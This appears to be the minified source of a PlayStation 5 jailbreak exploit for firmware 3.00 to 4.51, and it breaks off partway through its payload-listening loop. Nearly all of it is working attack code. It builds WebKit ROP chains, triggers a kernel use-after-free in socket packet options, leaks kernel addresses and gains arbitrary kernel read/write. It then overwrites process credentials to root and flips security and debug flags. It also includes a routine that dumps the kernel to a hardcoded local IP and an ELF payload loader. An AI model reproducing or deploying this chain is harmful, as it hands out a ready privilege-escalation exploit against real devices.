let chain,libSceNKWebKitBase,libSceLibcInternalBase,libKernelBase,textArea=document.createElement("textarea");if(!navigator.userAgent.includes("PlayStation 5"))throw alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`),new Error("");const supportedFirmwares=["3.00","3.10","3.20","3.21","4.00","4.02","4.03","4.50","4.51"],fw_idx=navigator.userAgent.indexOf("PlayStation; PlayStation 5/")+27,fw_str=navigator.userAgent.substring(fw_idx,fw_idx+4);if(document.getElementById("current-fw").innerHTML="Current firmware: "+fw_str,!supportedFirmwares.includes(fw_str))throw alert(`This firmware(${fw_str}) is not supported.`),new Error("");let nogc=[],syscalls={},gadgets={},worker=new Worker("rop_slave.js");async function wait_for_worker(){let d=await new Promise(d=>{const a=new MessageChannel;a.port1.onmessage=()=>{a.port1.close(),d(1)},worker.postMessage(0,[a.port2])});return d}function find_worker(){for(let d=p.read8(libKernelBase.add32(OFFSET_lk__thread_list));0!=d.low&&0!=d.hi;d=p.read8(d.add32(56))){let a=p.read8(d.add32(168)),e=p.read8(d.add32(176));if(524288==e.low)return a}alert("failed to find worker.")}function print(d){document.getElementById("console").innerHTML+=d+"\n",document.getElementById("jb-progress-status-text").innerHTML=d}async function userland(){function d(d){d.push(gadgets["pop rdi"]),d.push(S),d.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp))}async function a(d){let a=p.read8(F);d.push_write8(S,L),d.push_write8(S.add32(16),x),d.push_write8(F,a),d.push(gadgets["pop rdi"]),d.push(S),d.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp)),p.write8(x,gadgets["pop rsp"]),p.write8(F,d.stack_entry_point);let e=await new Promise(d=>{const a=new MessageChannel;a.port1.onmessage=()=>{a.port1.close(),d(1)},worker.postMessage(0,[a.port2])});0===e&&(alert("The rop thread ran away. "),p.write8(0,0))}function e(d){return(255&d)<<8|d>>>8}function l(d){let a=d.split("."),e=0;for(let l=0;4>l;l++)e|=parseInt(a[l])<<8*l;return e>>>0}function r(d,a){let e=-2&a/8-1;for(let e=0;e<a/4;e++)p.write4(d.add32(4*e),0);return p.write1(d.add32(0),0),p.write1(d.add32(1),e),p.write1(d.add32(2),0),p.write1(d.add32(3),e/2),8*(e+1)}function t(d,a,e,l){p.write1(d.add32(0),16),p.write1(d.add32(1),a),p.write2(d.add32(2),e),p.write4(d.add32(4),l)}async function s(d){!1,print(d)}async function i(d,a){p.write4(bd,a),0==kd&&(await chain.add_syscall(O,Ed,fd,16),kd=1),await chain.add_syscall(P,Ed,d,a),await chain.run()}async function n(d){await s("Loading ELF file: "+d+" ...");const a=await fetch("payloads/"+d);if(!a.ok)throw new Error(`Failed to fetch the binary file. Status: ${a.status}`);const e=await a.arrayBuffer(),l=new Uint32Array(e);ve.backing.set(l)}async function o(d=-1){if(await s("===== Stage 6 - ELF Loader ====="),Le=p.read4(ve.add32(re)),Fe=65535&p.read4(ve.add32(te)),elf_entry_point=p.read4(ve.add32(le)),64!=Le)throw await s("[!] ELF header malformed, terminating connection."),new Error("ELF header malformed, terminating connection.");await s("[+] Received ELF file ("+d.toString(10)+" bytes), loading...");let a=0,e=0,l=0,r=0,t=0,n=0,o=0;for(let r=0;r<Fe;r++){let d=Le+r*ee,s=p.read4(ve.add32(d+se)),i=p.read4(ve.add32(d+ie)),c=p.read4(ve.add32(d+ne)),_=p.read4(ve.add32(d+oe)),u=p.read4(ve.add32(d+ce)),w=4294950912&u+16383;if(s==pe)if(1==(1&i)){a=u,await chain.add_syscall_ret(de,W,0,w,7),await chain.run();let d=p.read4(de);await chain.add_syscall_ret(de,Y,d,3),await chain.run();let e=p.read4(de);await chain.add_syscall_ret(ke,z,Se,w,3,17,e,0),await chain.run(),o=p.read8(ke);let l=p.read8(ke);for(let d,a=0;a<u;a+=8)d=p.read8(ve.add32(c+a)),p.write8(l.add32(a),d);await chain.add_syscall_ret(ke,z,xe.add32(_),w,5,17,d,0),await chain.run()}else{data_mapping_addr=xe.add32(_),e=w,await chain.add_syscall_ret(ke,z,xe.add32(_),w,3,4114,4294967295,0),await chain.run();let d=xe.add32(_);for(let a,e=0;e<u;e+=8)a=p.read8(ve.add32(c+e)),p.write8(d.add32(e),a)}if(s==ye)for(let d=0;;d+=16){let a=p.read8(ve.add32(c+d)).low,e=p.read8(ve.add32(c+d+8));if(a==me||256<d)break;7===a?l=e.low:8===a?t=e.low:9===a?n=e.low:void 0}}if(0!=l){l+=4096,r=t/n;for(let d=0;d<r;d++){let e=p.read8(ve.add32(l+d*n+_e)),r=p.read8(ve.add32(l+d*n+ue)),t=p.read8(ve.add32(l+d*n+we)),s=xe.add32(e.low);if(e.low<=a&&(s=o.add32(e.low)),(255&r.low)==he){let d=xe.add32(t.low);p.write8(s,d)}}}}async function c(){p.write8(Be,0),p.write8(Be.add32(4),0),p.write8(Ie,0),p.write8(Te,0),p.write8(Ae,0);for(let d=0;48>d;d++)p.write1(Me.add32(d),0);p.write4(Be.add32(0),jd),p.write4(Be.add32(4),ca),p.write8(Me.add32(0),$a),p.write8(Me.add32(8),xd),p.write8(Me.add32(16),Be),p.write8(Me.add32(24),Ha),p.write8(Me.add32(32),xa),p.write8(Me.add32(40),Ie),await s("  [+] Executing!"),await chain.call(libKernelBase.add32(OFFSET_lk_pthread_create_name_np),Te,0,xe.add32(elf_entry_point),Me,p.stringify("payload"))}async function _(){await chain.call(libKernelBase.add32(OFFSET_lk_pthread_join),p.read8(Te),Ae),await s("  [+] Finished, out = 0x"+p.read8(Ie).toString(16))}async function u(d,a,r=!1){let s=p.malloc(4);await chain.add_syscall_ret(s,q,G,K,0),await chain.run();let i=p.read4(s);if(0>i)return void alert("sock_fd invalid: "+i);if(r){await chain.add_syscall(U,i,6,1,1,4),await chain.run()}let n=p.malloc(16);for(let e=0;16>e;e+=8)p.write8(n.add32(e),0);let o=l(d),c=e(a);return t(n,G,c,o),await chain.add_syscall(O,i,n,16),await chain.run(),i}async function w(d){await chain.add_syscall(j,d),await chain.run()}async function y(d,a,e=!1){const l=await fetch("payloads/"+d);if(!l.ok)throw new Error(`Failed to fetch the binary file. Status: ${l.status}`);const r=await l.arrayBuffer(),t=new Uint8Array(r);if(e){let d=t.length;for(let a,e=0;8>e;e++)a=ve.add32(e),p.write1(a,255&d),d>>>=8}for(let l,r=0;r<t.length;r+=1)l=ve.add32(e?r+8:r),p.write1(l,t[r]);await s("Elf loaded to memory."),await chain.add_syscall(P,a,ve,e?t.length+8:t.length),await chain.run()}async function m(d){try{let a=await n(d);await o(a),await c(),await _()}catch(d){s("Failed to load local elf: "+d)}}async function h(d,a){try{let e=await n(d);await o(e),await c();let l=await u("127.0.0.1",9021,!0);await _(),await w(l);let r=await u("127.0.0.1",9027);await y(a,r,!0),await w(r)}catch(d){s("Failed to load libhijacker: "+d),alert("Failed to load libhijacker: "+d)}}async function g(){let d=p.malloc(4);await chain.add_syscall_ret(d,125,0,10),await chain.run();let a=p.read4(d),e=960,l=p.malloc(e*a),r=l.add32(0);await chain.add_syscall(125,r,a),await chain.run();let t=[];for(let d,r=0;r<a;r++){d="";for(let a,t=0;16>t&&(a=p.read1(l.add32(e*r+t)),0!=a);t++)d+=String.fromCharCode(a);let a="";for(let d=40;44>d;d++)a+=p.read1(l.add32(e*r+d)).toString(10)+".";a=a.slice(0,-1),t.push({name:d,ip:a})}return t}function f(d,a,e){if(e>=8*a)throw new Error("set_bit: bit out of range");let l=d.add32(e/8),r=p.read1(l);p.write1(l,r|1<<e%8)}function b(d,a,e){if(e>=8*a)throw new Error("get_bit: bit out of range");let l=d.add32(e/8),r=p.read1(l);return 0!=(r&1<<e%8)}p.pre_chain=d,p.launch_chain=a,p.malloc=function(d,a=4){let e;1==a?e=new Uint8Array(65536+d):2==a?e=new Uint16Array(65536+d):4==a&&(e=new Uint32Array(65536+d)),nogc.push(e);let l=p.read8(p.leakval(e).add32(16));return l.backing=e,l},p.malloc_dump=function(d){let a;a=new Uint8Array(d),nogc.push(a);let e=p.read8(p.leakval(a).add32(16));return e.backing=a,e},p.stringify=function(d){let a=new Uint8Array(d.length+1);for(let e=0;e<d.length;e++)a[e]=255&d.charCodeAt(e);nogc.push(a);let e=p.read8(p.leakval(a).add32(16));return e.backing=a,e},p.array_from_address=function(d,a){let e=new Uint32Array(4096),l=p.leakval(e).add32(16);return p.write8(l,d),p.write4(l.add32(8),a),p.write4(l.add32(12),1),nogc.push(e),e},p.readstr=function(d){let a="";for(let e,l=0;;l++){if(e=p.read1(d.add32(l)),0==e)break;a+=String.fromCharCode(e)}return a},p.writestr=function(d,a){let e=d.add32(0);if("string"==typeof a)for(let d,l=0;l<a.length&&(d=a.charCodeAt(l),0!=d);l++)p.write1(e,d),e.add32inplace(1);p.write1(e,0)};let k=p.read8(p.leakval(textArea).add32(24)),E=p.read8(k);for(let d in libSceNKWebKitBase=p.read8(E).sub32(OFFSET_wk_vtable_first_element),libSceLibcInternalBase=p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import)),libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset),libKernelBase=p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import)),libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard),wk_gadgetmap)gadgets[d]=libSceNKWebKitBase.add32(wk_gadgetmap[d]);for(let d in syscall_map)syscalls[d]=libKernelBase.add32(syscall_map[d]);await wait_for_worker();let v=find_worker(),S=p.malloc(64),x=v.add32(OFFSET_WORKER_STACK_OFFSET),L=p.read8(x),F=x.add32(8);chain=new worker_rop;let B=await chain.syscall(20);if(0==B.low)for(alert("webkit exploit failed. Try again if your ps5 fw is >= 300 && <= 451."),p.write8(0,0);;);let I=l("10.0.0.193"),T=e(5655),A=e(5656),M=16,C=112,H=3,P=4,j=6,q=97,O=98,U=105,N=118,R=362,Q=466,z=477,D=488,W=533,Y=534,G=2,J=28,K=1,V=2,X=17,Z=41,$=61,dd=25,ad=51,ed=46,ld=65,rd=66,td=322371584,sd=1932591104,nd=400,od=150,cd=p.malloc(1280),_d=p.malloc(4),ud=p.malloc(256),wd=p.malloc(4),pd=p.malloc(16),yd=p.malloc(4),md=0;await chain.add_syscall_ret(wd,q,G,K,0),await chain.run();let hd=p.read4(wd);for(let d=0;16>d;d+=8)p.write8(pd.add32(d),0);t(pd,G,T,I);let gd=p.malloc(4),fd=p.malloc(16),bd=p.malloc(4),kd=0;await chain.add_syscall_ret(gd,q,G,K,0),await chain.run();let Ed=p.read4(gd);for(let d=0;16>d;d+=8)p.write8(fd.add32(d),0);t(fd,G,A,I),!1;let vd,Sd,xd=p.malloc(8);await chain.syscall(687,xd,0),vd=p.read4(xd),Sd=p.read4(xd.add32(4)),await s("===== Stage 1 - UAF Trigger =====");let Ld=p.malloc(4),Fd=p.malloc(1792),Bd=p.malloc(1792),Id=p.array_from_address(Fd,4*nd),Td=p.malloc(1024),Ad=p.malloc(24),Md=p.malloc(4),Cd=p.malloc(8),Hd=p.malloc(8),Pd=p.malloc(8);await chain.add_syscall_ret(Ld,q,J,V,X);for(let d=0;d<nd;d++)await chain.add_syscall_ret(Fd.add32(4*d),q,J,V,X);await chain.run(),await s("[+] Created sockets...");let jd=p.read4(Ld);p.write4(Ad.add32(0),20),p.write4(Ad.add32(4),Z),p.write4(Ad.add32(8),$),p.write4(Ad.add32(16),0),p.write4(Md,ld),p.write4(Pd,4);let qd=1,Od=new int64(4294967295,4294967295),id=16,Ud=p.malloc(16);p.write1(Ud.add32(1),64),await chain.syscall(D,3,qd,Od,id,Ud);let Nd=p.malloc(4);p.write2(Nd.add32(0),1),p.write2(Nd.add32(2),256),await chain.syscall(Q,1,0,Nd),await chain.run(),await s("[+] Setting up use thread...");let Rd=p.malloc(8),Qd=p.malloc(8),zd=p.malloc(8),Dd=p.malloc(8),Wd=p.malloc(8),Yd=p.malloc(8),Gd=p.malloc(8),Jd=p.malloc(8),Kd=p.malloc(8);p.write8(Rd,1),p.write8(Qd,0),p.write8(zd,0),p.write8(Dd,0),p.write8(Wd,0),p.write8(Yd,1),p.write8(Gd,0),p.write8(Jd,0),p.write8(Kd,0);let Vd=new thread_rop("rop_thread_use");{let d=p.read4(Ld);p.write1(Ud.add32(1),128),Vd.self_healing_syscall(D,3,qd,Od,id,Ud),Vd.self_healing_syscall(Q,1,0,Nd);const a=Vd.get_rsp(),e=Vd.create_branch(Vd.branch_types.EQUAL,zd,1),l=Vd.get_rsp(),r=Vd.create_branch(Vd.branch_types.EQUAL,Dd,1),t=Vd.get_rsp();Vd.self_healing_syscall(U,d,Z,dd,Ad,24);const s=Vd.get_rsp();Vd.push_write8(Dd,0),Vd.jmp_to_rsp(a),Vd.set_branch_points(e,s,l),Vd.set_branch_points(r,t,a)}await s("[+] Triggering UAF...");let Xd=p.read4(Md),Zd=await Vd.spawn_thread();{const d=chain.get_rsp();chain.push_write8(Dd,1),await chain.add_syscall(U,jd,Z,dd,0,0),chain.push_write8(Hd,ld);for(let d=0;d<nd;d++)await chain.add_syscall(U,p.read4(Fd.add32(4*d)),Z,$,Hd,4);await chain.add_syscall(N,jd,Z,$,Cd,Pd);const a=chain.create_branch(Vd.branch_types.EQUAL,Cd,ld),e=chain.get_rsp();for(let d=0;d<nd;d++)await chain.add_syscall(U,p.read4(Fd.add32(4*d)),Z,dd,0,0);chain.jmp_to_rsp(d);const l=chain.get_rsp();chain.push_write8(zd,1),chain.push_write8(Hd,rd),await chain.add_syscall(U,jd,Z,$,Hd,4);for(let d=0;d<nd;d++)await chain.add_syscall(N,p.read4(Fd.add32(4*d)),Z,$,Md.add32(4*d),Pd);chain.set_branch_points(a,l,e)}await chain.run();let $d=0,da=0,aa=0;for(let d=0;d<nd;d++)if(p.read4(Md.add32(4*d))==rd){$d=1,da=d,aa=p.read4(Fd.add32(4*d));break}if(0==$d)return void(await s("[!] Failed to find overlap, try again."));await chain.add_syscall_ret(Fd.add32(4*da),q,J,V,X),await chain.run(),await s("===== Stage 2 - Overlap pktopts =====");let ea=async function(d,a,e){await chain.add_syscall(U,d,Z,dd,0,0);let l=r(ud,256);for(let r,t=0;t<nd;t++)r=p.read4(Fd.add32(4*t)),chain.push_write8(ud.add32(M),a),chain.push_write4(ud.add32(192),e|t),await chain.add_syscall(U,r,Z,ad,ud,l);await chain.add_syscall(N,jd,Z,$,cd,Pd),await chain.run(),tagged_tclass=p.read4(cd)};p.write4(Md,0);for(let d,a=0;a<nd;a++)d=p.read4(Fd.add32(4*a)),await chain.add_syscall(U,d,Z,dd,0,0),await chain.add_syscall(U,d,Z,$,Md,4);if(await ea(aa,0,td),await chain.run(),(4294901760&tagged_tclass)!=td)return void(await s("[!] Failed to refill pktopts"));da=65535&tagged_tclass,aa=p.read4(Fd.add32(4*da)),await chain.add_syscall_ret(Fd.add32(4*da),q,J,V,X),await chain.run(),await s("===== Stage 3 - Infoleak =====");let la=p.malloc(8),ra=p.malloc(2048),ta=async function(d){let a=r(ra,d);if(288==d){for(let d=0;92>d;d++)await chain.add_syscall_ret(Td.add32(4*d),R);await chain.run();for(let d,a=0;92>a;a+=2)d=p.read4(Td.add32(4*a)),chain.push_,await chain.add_syscall(j,d)}await chain.add_syscall(U,jd,Z,ad,ra,a),chain.push_write8(la,d),await chain.add_syscall(N,aa,Z,ad,ra,la),await chain.run()};await s("[+] Leaking kqueue...");for(let d,a=0;a<nd;a++)d=p.read4(Fd.add32(4*a)),await chain.add_syscall(U,d,Z,dd,0,0);await ta(288);let sa=p.read8(ra.add32(C));await s("  [+] kqueue = 0x"+sa),await chain.add_syscall(U,jd,Z,ad,0,0);for(let d=0;d<od-94;d++)await chain.add_syscall_ret(Td.add32(4*d),R);await chain.run(),await ta(256);let ia=p.read8(ra.add32(C));await s("  [+] pktopts addr = 0x"+ia),await chain.add_syscall(U,jd,Z,ad,0,0),p.write4(Md,0);for(let d,a=0;a<nd;a++)d=p.read4(Fd.add32(4*a)),await chain.add_syscall(U,d,Z,$,Md,4);for(let d,a=0;a<nd;a++)d=p.read4(Fd.add32(4*a)),await chain.add_syscall(U,d,Z,dd,0,0),await chain.add_syscall(U,d,Z,$,Md,4);await chain.run(),await s("===== Stage 4 - Arbitrary Read/Write =====");let na=0,oa=0,ca=0,_a=p.malloc(20),ua=p.malloc(20*nd),wa=p.malloc(4),pa=p.malloc(20),ya=p.malloc(20);p.write4(wa,20);for(let d=0;20>d;d+=4)p.write4(ya.add32(d),0);let ma=async function(d){p.write8(_a.add32(0),d),p.write8(_a.add32(8),0),p.write4(_a.add32(16),0),await chain.add_syscall(U,jd,Z,ed,_a,20)},ha=async function(d){0==d&&(await ma(ia.add32(M)));for(let a,e=0;e<nd;e++)a=p.read4(Fd.add32(4*e)),await chain.add_syscall(N,a,Z,ed,ua.add32(20*e),wa);await chain.run()},ga=async function(d){await ma(d),await chain.add_syscall(N,ca,Z,ed,pa,wa),await chain.run()};if(tagged_tclass=0,await ea(aa,ia.add32(M),sd),(4294901760&tagged_tclass)!=sd)return void(await s("[!] Failed to refill pktopts"));da=65535&tagged_tclass,aa=p.read4(Fd.add32(4*da)),await chain.add_syscall_ret(Fd.add32(4*da),q,J,V,X),await chain.run(),await ha(1);for(let d=0;d<nd;d++)0!=p.read4(ua.add32(20*d))&&(na=1,oa=d,ca=p.read4(Fd.add32(4*oa)),s("[!] Bad victim pair, found victim socket: 0x"+ca+" | i = 0x"+d.toString(16)));if(1==na)return void s("[!] We're screwed, can't continue");await ha(0);for(let d=0;d<nd;d++)if(p.read4(ua.add32(20*d))==ia.add32(M).low){na=1,oa=d,ca=p.read4(Fd.add32(4*oa));break}if(0==na)return void(await s("[!] Failed to find victim socket"));await s("[+] Arbitrary kernel read/write established");let fa=sa,ba=0,ka=new int64(0,0),Ea=p.malloc_dump(65536);p.write4(wa,20);for(let d=0;4096>d;d+=8)if(await ga(fa.add32(d)),ka=p.read8(pa),0==OFFSET_KERNEL_DATA_KQUEUE_LOW_WORD){if(4294967295==ka.hi&&2147483648<=ka.low&&4278190080>=ka.low){await ga(ka);let d=p.read4(pa);if(1702195563==d){alert(`OFFSET_KERNEL_DATA_KQUEUE_LOW_WORD == 0x${(65535&ka.low).toString(16)} add this offset to the firmware's file, reboot and dump the readable segment of the kernel.`),ba=ka;break}}}else if((65535&ka.low)==OFFSET_KERNEL_DATA_KQUEUE_LOW_WORD){ba=ka,await s("[+] Found kqueue .data address: 0x"+ba.toString(16)+" (found @ i = 0x"+d.toString(16)+")");break}let va=0;if(0==ba){await s("[!] Couldn't find recognized .data address, retrying 5 more times.");for(let d=0;5>d;d++){await ta(288),fa=p.read8(ra.add32(C)),await s("  [+] kqueue = 0x"+sa),await chain.add_syscall(U,jd,Z,ad,0,0);for(let d=0;d<od-94;d++)await chain.add_syscall_ret(Td.add32(4*d),R);await chain.run();for(let a=0;4096>a;a+=8)if(await ga(fa.add32(a)),ka=p.read8(pa),0==OFFSET_KERNEL_DATA_KQUEUE_LOW_WORD){if(4294967295==ka.hi&&2147483648<=ka.low&&4278190080>=ka.low){await ga(ka);let d=p.read4(pa);if(1702195563==d){alert(`OFFSET_KERNEL_DATA_KQUEUE_LOW_WORD == 0x${(65535&ka.low).toString(16)} add this offset to the firmware's file, reboot and dump the readable segment of the kernel.`),ba=ka;break}}}else if((65535&ka.low)==OFFSET_KERNEL_DATA_KQUEUE_LOW_WORD){ba=ka,va=1,await s("[+] Retry "+d.toString(10)+" found kqueue .data address: 0x"+ba.toString(16)+" (found @ i = 0x"+a.toString(16)+")");break}if(1==va)break}}if(0==ba)return void(await s("[!] Still couldn't find recognized .data address, reboot."));if(0==OFFSET_KERNEL_DATA_KQUEUE_BASE_SLIDE){let d=ba.and32(4294963200);for(let a=0;;a++){await ga(d);let e=p.read8(pa),l=p.read8(pa.add32(8));if(e.low!=1||e.hi!=1||l.low!=0||l.hi!=0){d.sub32inplace(4096);continue}await ga(d.add32(20));let r=p.read8(pa),t=p.read8(pa.add32(8));if(r.low!=4294967295||r.hi!=8||t.low!=0){d.sub32inplace(4096);continue}alert(`kqueue string: ${ba} .rodata: ${d} offset masked: -(${4096*a}) ; .start offset: ${4096*a+65536}`);break}let a=d.sub32(65536);alert(`going to dump the kernel, make sure you set your own ip & that the dump server is running`);for(let d=0;;d++){for(let d=0;4096>d;d+=16)chain.push_write8(_a.add32(0),a.add32(d)),chain.push_write8(_a.add32(8),0),chain.push_write4(_a.add32(16),0),await chain.add_syscall(U,jd,Z,ed,_a,20),await chain.add_syscall(N,ca,Z,ed,Ea.add32(d),wa);await i(Ea,4096),a.add32inplace(4096)}}await s("===== Stage 5 - Privilege Escalation / Data Patch ====="),await chain.add_syscall_ret(cd,20),await chain.run();let Sa=p.read4(cd);await s("[+] PID: 0x"+Sa.toString(16)),ba=ba.sub32(OFFSET_KERNEL_DATA_KQUEUE_BASE_SLIDE),ba=ba.and32(4294963200);let xa=ba,La=xa.add32(OFFSET_KERNEL_DATA_BASE_ALLPROC),Fa=0,Ba=0;await s("[+] Found kernel .data base address: 0x"+xa.toString(16)),await ga(La);let Ia=p.read8(pa);for(;;){await ga(Ia.add32(0));let d=p.read8(pa.add32(0));if(await ga(Ia.add32(188)),p.read4(pa)==Sa){await ga(Ia.add32(64)),Fa=p.read8(pa.add32(0)),Ba=p.read8(pa.add32(8));break}if(0==d.low)break;Ia=d}await s("  [+] Found proc->p_ucred: 0x"+Fa.toString(16)),await s("  [+] Found proc->p_fd: 0x"+Ba.toString(16));let Ta=0,Aa=async function(d){0==Ta&&(chain.push_write8(_a.add32(0),Ba.add32(0)),chain.push_write8(_a.add32(8),0),chain.push_write4(_a.add32(16),0),await chain.add_syscall(U,jd,Z,ed,_a,20),await chain.add_syscall(N,ca,Z,ed,pa,wa),await chain.run(),Ta=p.read8(pa).add32(8));let a=Ta.add32(48*d);chain.push_write8(_a.add32(0),a.add32(0)),chain.push_write8(_a.add32(8),0),chain.push_write4(_a.add32(16),0),await chain.add_syscall(U,jd,Z,ed,_a,20),await chain.add_syscall(N,ca,Z,ed,pa,wa),await chain.run();let e=p.read8(pa).add32(0);chain.push_write8(_a.add32(0),e.add32(0)),chain.push_write8(_a.add32(8),0),chain.push_write4(_a.add32(16),0),await chain.add_syscall(U,jd,Z,ed,_a,20),await chain.add_syscall(N,ca,Z,ed,pa,wa),await chain.run();let l=p.read8(pa).add32(0);chain.push_write8(_a.add32(0),l),chain.push_write8(_a.add32(8),0),chain.push_write4(_a.add32(16),0),chain.push_write4(ya.add32(0),256),chain.push_write4(ya.add32(4),2),chain.push_write8(ya.add32(8),0),chain.push_write4(ya.add32(12),0),await chain.add_syscall(U,jd,Z,ed,_a,20),await chain.add_syscall(U,ca,Z,ed,ya,20),await chain.run()};await Aa(aa),await Aa(jd),await Aa(ca);let Ma=Ta.add32(48*vd);await ga(Ma.add32(0));let Ca=p.read8(pa);await ga(Ca.add32(0));let Ha=p.read8(pa),Pa=async function(d,a,e){"undefined"==typeof Pa.value&&(Pa.value0=new int64(1073741824,1073741824),Pa.value1=new int64(0,1073741824)),chain.push_write8(_a.add32(0),Ha.add32(0)),chain.push_write8(_a.add32(8),0),chain.push_write4(_a.add32(16),0),chain.push_write8(ya.add32(0),Pa.value0),chain.push_write8(ya.add32(8),Pa.value1),chain.push_write4(ya.add32(16),0),await chain.add_syscall(U,jd,Z,ed,_a,20),await chain.add_syscall(U,ca,Z,ed,ya,20),chain.push_write8(_a.add32(0),Ha.add32(16)),chain.push_write8(_a.add32(8),0),chain.push_write4(_a.add32(16),0),chain.push_write8(ya.add32(0),a),chain.push_write8(ya.add32(8),0),chain.push_write4(ya.add32(16),0),await chain.add_syscall(U,jd,Z,ed,_a,20),await chain.add_syscall(U,ca,Z,ed,ya,20),await chain.add_syscall(H,vd,d,e),await chain.run()},ja=async function(d,a,e){"undefined"==typeof ja.value&&(ja.value=new int64(0,1073741824)),chain.push_write8(_a.add32(0),Ha.add32(0)),chain.push_write8(_a.add32(8),0),chain.push_write4(_a.add32(16),0),chain.push_write8(ya.add32(0),0),chain.push_write8(ya.add32(8),ja.value),chain.push_write4(ya.add32(16),0),await chain.add_syscall(U,jd,Z,ed,_a,20),await chain.add_syscall(U,ca,Z,ed,ya,20),chain.push_write8(_a.add32(0),Ha.add32(16)),chain.push_write8(_a.add32(8),0),chain.push_write4(_a.add32(16),0),chain.push_write8(ya.add32(0),d),chain.push_write8(ya.add32(8),0),chain.push_write4(ya.add32(16),0),await chain.add_syscall(U,jd,Z,ed,_a,20),await chain.add_syscall(U,ca,Z,ed,ya,20),await chain.add_syscall(P,Sd,a,e),await chain.run()};await ga(xa.add32(OFFSET_KERNEL_DATA_BASE_SECURITYFLAGS));let qa=p.read4(pa);qa|=20,p.write4(pa,qa),await ja(xa.add32(OFFSET_KERNEL_DATA_BASE_SECURITYFLAGS),pa,4),await ga(xa.add32(OFFSET_KERNEL_DATA_BASE_PS4SDK));let Oa=p.read4(pa);Oa=2576980377,p.write4(pa,Oa),await ja(xa.add32(OFFSET_KERNEL_DATA_BASE_PS4SDK),pa,4),await ga(xa.add32(OFFSET_KERNEL_DATA_BASE_TARGETID));let Ua=p.read1(pa);Ua=130,p.write1(pa,Ua),await ja(xa.add32(OFFSET_KERNEL_DATA_BASE_TARGETID),pa,16),await ga(xa.add32(OFFSET_KERNEL_DATA_BASE_QA_FLAGS));let Na=p.read2(pa.add32(1));Na|=259,p.write2(pa.add32(2),Na),await ja(xa.add32(OFFSET_KERNEL_DATA_BASE_QA_FLAGS),pa,16),await ga(xa.add32(OFFSET_KERNEL_DATA_BASE_UTOKEN_FLAGS));let Ra=p.read1(pa);Ra|=1,p.write1(pa,Ra),await ja(xa.add32(OFFSET_KERNEL_DATA_BASE_UTOKEN_FLAGS),pa,16),await s("[+] Enabled debug settings");let Qa=p.malloc(256);await Pa(Qa,xa.add32(OFFSET_KERNEL_DATA_BASE_ROOTVNODE),256);let za=p.malloc(4),Da=p.malloc(4),Wa=p.malloc(8),Ya=p.malloc(8),Ga=p.malloc(8);p.write4(za,0),p.write4(Da,1),p.write8(Wa,new int64(19,1208025088)),p.write8(Ya,new int64(4294967295,4294967295)),p.write1(Ga,128),await ja(Fa.add32(4),za,4),await ja(Fa.add32(8),za,4),await ja(Fa.add32(12),za,4),await ja(Fa.add32(16),Da,4),await ja(Fa.add32(20),za,4),await ja(Ba.add32(16),Qa,8),await ja(Ba.add32(24),Qa,8),await ja(Fa.add32(88),Wa,8),await ja(Fa.add32(96),Ya,8),await ja(Fa.add32(104),Ya,8),await ja(Fa.add32(131),Ga,1);let Ja=p.malloc(8),Ka=p.malloc(4);p.write4(Ka,0),await Pa(Ja,Ia.add32(1e3),8);let Va=p.read8(Ja).add32(280);await ja(Va,Ka,4);let Xa=p.malloc(8);p.write8(Xa,1);let Za=p.read8(Ja).add32(24);await ja(Za,Xa,8),await chain.add_syscall_ret(cd,24),await chain.run(),await s("[+] Patched creds, checking uid = 0x"+p.read4(cd).toString(16));for(let d,a=0;a<nd;a++)d=p.read4(Fd.add32(4*a)),d!=ca&&(await chain.add_syscall(j,d));await chain.run();for(let d,a=0;a<od;a++)d=p.read4(Td.add32(4*a)),await chain.add_syscall(j,d);await chain.run();let $a=syscalls[591],de=p.malloc(4),ae=p.malloc(4),ee=56,le=24,re=32,te=56,se=0,ie=4,ne=8,oe=16,ce=40,_e=0,ue=8,we=16,pe=1,ye=2,me=0,he=8,ge=p.malloc(4),fe=p.malloc(16),be=p.malloc(4),ke=p.malloc(8),Ee=64+16*ee+16777216,ve=p.malloc(Ee),Se=new int64(537919488,9),xe=new int64(638582784,9),Le=0,Fe=0;p.write4(be,16);let Be=p.malloc(8),Ie=p.malloc(8),Te=p.malloc(8),Ae=p.malloc(8),Me=p.malloc(48);document.getElementById("run-jb-parent").style.display="none";let Ce=document.getElementById("jb-progress");Ce.style.opacity="0",await sleep(500),Ce.style.display="none";let He=document.getElementById("credits");He.remove();let Pe=document.getElementById("post-jb-view");Pe.style.pointerEvents="all",Pe.style.opacity="1",Pe.style.maxHeight="fit-content",Pe.style.overflowY="visible",await sleep(600),window.ip_list=await g();let je=window.ip_list.find(d=>"0.0.0.0"!=d.ip),qe="Offline";null!=je&&(qe="Listening on: "+je.ip+":9020 ("+je.name+")");let Oe=p.malloc(16),Ue=p.malloc(4),Ne=e(9020);await chain.add_syscall_ret(Ue,q,G,K,0),await chain.run();let Re=p.read4(Ue);for(let d=0;16>d;d+=8)p.write8(Oe.add32(d),0);t(Oe,G,Ne,0),await chain.add_syscall_ret(ae,104,Re,Oe,16),await chain.add_syscall_ret(ae,106,Re,5),await chain.run(),document.getElementById("listening-ip").innerHTML=qe;let Qe=!1,ze=128,De=p.malloc(ze),We=16,Ye=p.malloc(We),Ge=p.malloc(4);for(jb_in_progress=!1;;){for(;!Qe;){for(;0<window.local_payload_queue.length;){try{document.getElementById("listening-ip").innerHTML=qe+" (paused)";let d=window.local_payload_queue.shift();if(showToast("Loading "+d.displayTitle),document.getElementById("msgs").innerHTML="Carregando as cargas &#250;teis necess&#225;rias...","libhijacker"==d.loader){let a=d.fileName.split(";")[0],e=d.fileName.split(";")[1];await h(a,e)}else await m(d.fileName)}catch(d){alert("Failed to load payload: "+d)}showToast("Payload exited."),document.getElementById("msgs").innerHTML="P R O N T O ! ! !"}document.getElementById("listening-ip").innerHTML=qe;for(let d=0;d<We;d++)p.write1(Ye.add32(d),0);for(let d=0;d<ze;d++)p.write1(De.add32(d),0);p.write1(Ye.add32(0),1),f(De,ze,Re),await chain.add_syscall_ret(Ge,93,Re+1,De.add32(0),0,0,Ye.add32(0)),await chain.run();let d=p.read4(Ge);if(0>d)throw new Error("select failed: "+d);let a=b(De,ze,Re);a&&(Qe=!0)}document.getElementById("listening-ip").innerHTML=qe+" 